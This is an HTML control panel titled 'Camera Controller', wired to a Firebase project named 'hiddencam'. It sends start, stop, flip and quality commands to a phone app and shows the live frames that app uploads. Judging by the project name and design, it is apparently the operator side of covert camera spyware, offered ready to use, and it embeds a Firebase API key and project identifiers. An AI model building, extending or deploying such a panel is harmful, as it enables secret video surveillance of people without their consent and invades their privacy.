<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Camera Controller</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000000, #1a1a2e);
            min-height: 100vh;
            font-family: system-ui, -apple-system, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: white;
            font-size: 28px;
            margin-bottom: 5px;
        }
        
        .header p {
            color: #888;
            font-size: 14px;
        }
        
        .status-card {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .device-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .status-dot.online {
            background: #22c55e;
            box-shadow: 0 0 8px #22c55e;
            animation: pulse 1.5s infinite;
        }
        
        .status-dot.offline {
            background: #ef4444;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .device-name {
            color: white;
            font-size: 14px;
        }
        
        .device-id {
            color: #888;
            font-size: 11px;
            font-family: monospace;
            margin-top: 5px;
        }
        
        .stream-card {
            background: rgba(0,0,0,0.6);
            border-radius: 20px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.15);
            margin-bottom: 20px;
        }
        
        .video-container {
            background: #000;
            border-radius: 16px;
            overflow: hidden;
            aspect-ratio: 16/9;
            border: 2px solid #333;
            margin-bottom: 15px;
        }
        
        #streamImage {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .stream-info {
            display: flex;
            justify-content: space-between;
            color: #aaa;
            font-size: 13px;
        }
        
        .fps {
            color: #22c55e;
            font-family: monospace;
            font-size: 16px;
        }
        
        .control-card {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .control-title {
            color: white;
            font-size: 16px;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        button {
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        button:active {
            transform: scale(0.96);
        }
        
        .btn-start {
            background: #22c55e;
            color: white;
            box-shadow: 0 0 10px rgba(34,197,94,0.3);
        }
        
        .btn-stop {
            background: #ef4444;
            color: white;
            box-shadow: 0 0 10px rgba(239,68,68,0.3);
        }
        
        .btn-flip {
            background: #3b82f6;
            color: white;
        }
        
        .quality-card {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .quality-title {
            color: white;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: center;
        }
        
        .quality-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .quality-btn {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            padding: 8px 20px;
            border-radius: 30px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        
        .quality-btn.active {
            background: #22c55e;
            border-color: #22c55e;
        }
        
        .footer {
            text-align: center;
            color: #555;
            font-size: 11px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📷 Camera Controller</h1>
            <p>Firebase Controlled Camera</p>
        </div>
        
        <div class="status-card">
            <div class="device-status">
                <div class="status-dot offline" id="statusDot"></div>
                <span class="device-name" id="deviceStatus">Device Offline</span>
            </div>
            <div class="device-id" id="deviceId">No device connected</div>
        </div>
        
        <div class="stream-card">
            <div class="video-container">
                <img id="streamImage" src="">
            </div>
            <div class="stream-info">
                <span>📡 Live Feed</span>
                <span class="fps">⚡ <span id="fpsValue">0</span> FPS</span>
            </div>
        </div>
        
        <div class="quality-card">
            <div class="quality-title">🎯 Stream Quality</div>
            <div class="quality-buttons" id="qualityButtons">
                <button class="quality-btn" data-quality="140p">140p</button>
                <button class="quality-btn active" data-quality="240p">240p</button>
                <button class="quality-btn" data-quality="360p">360p</button>
            </div>
        </div>
        
        <div class="control-card">
            <div class="control-title">🎮 Camera Control</div>
            <div class="button-group">
                <button class="btn-start" id="startBtn">▶ START</button>
                <button class="btn-stop" id="stopBtn">⏹ STOP</button>
                <button class="btn-flip" id="flipBtn">🔄 Flip Camera</button>
            </div>
        </div>
        
        <div class="footer">
            🔒 Firebase Realtime DB | 🎯 Real-time Control
        </div>
    </div>
    
    <script>
        // 🔴🔴🔴 FIREBASE CONFIG (APNI DALO) 🔴🔴🔴
        const firebaseConfig = {
            apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
            authDomain: "hiddencam-62e2d.firebaseapp.com",
            databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
            projectId: "hiddencam-62e2d",
            storageBucket: "hiddencam-62e2d.firebasestorage.app",
            messagingSenderId: "931792860891",
            appId: "1:931792860891:android:602d1099f876f4688d7efe"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // Device ID (fixed for web control)
        const deviceId = "web_controller";
        
        // DOM Elements
        const statusDot = document.getElementById('statusDot');
        const deviceStatus = document.getElementById('deviceStatus');
        const deviceIdSpan = document.getElementById('deviceId');
        const streamImage = document.getElementById('streamImage');
        const fpsSpan = document.getElementById('fpsValue');
        
        let fps = 0;
        let lastFpsUpdate = Date.now();
        
        function updateFPS() {
            const now = Date.now();
            if (now - lastFpsUpdate >= 1000) {
                fpsSpan.innerText = fps;
                fps = 0;
                lastFpsUpdate = now;
            }
            requestAnimationFrame(updateFPS);
        }
        updateFPS();
        
        // 🔴 Send Command to Firebase
        function sendCommand(command, value) {
            const commandRef = database.ref('commands/' + deviceId);
            commandRef.set({
                action: command,
                value: value || null,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
            console.log('Command sent:', command, value);
        }
        
        // 🔴 Listen for Frames from APK
        database.ref('frames/' + deviceId).on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.frame) {
                streamImage.src = data.frame;
                fps++;
                deviceStatus.innerText = 'Streaming Live';
                deviceStatus.style.color = '#22c55e';
                statusDot.className = 'status-dot online';
            }
        });
        
        // 🔴 Listen for Device Status
        database.ref('devices/' + deviceId + '/status').on('value', (snapshot) => {
            const status = snapshot.val();
            if (status === 'online') {
                statusDot.className = 'status-dot online';
                deviceStatus.innerText = 'Device Online';
                deviceStatus.style.color = '#22c55e';
            } else if (status === 'offline') {
                statusDot.className = 'status-dot offline';
                deviceStatus.innerText = 'Device Offline';
                deviceStatus.style.color = '#ef4444';
            }
        });
        
        database.ref('devices/' + deviceId + '/deviceId').on('value', (snapshot) => {
            const id = snapshot.val();
            if (id) {
                deviceIdSpan.innerText = '📱 ' + id.substring(0, 25) + '...';
            }
        });
        
        // 🔴 Control Buttons
        document.getElementById('startBtn').onclick = () => sendCommand('start');
        document.getElementById('stopBtn').onclick = () => sendCommand('stop');
        document.getElementById('flipBtn').onclick = () => sendCommand('flip');
        
        // 🔴 Quality Buttons
        document.querySelectorAll('.quality-btn').forEach(btn => {
            btn.onclick = () => {
                document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const quality = btn.dataset.quality;
                sendCommand('quality', quality);
            };
        });
        
        // 🔴 Send heartbeat to show web is active
        setInterval(() => {
            database.ref('web_control/active').set(true);
        }, 30000);
    </script>
</body>
</html>
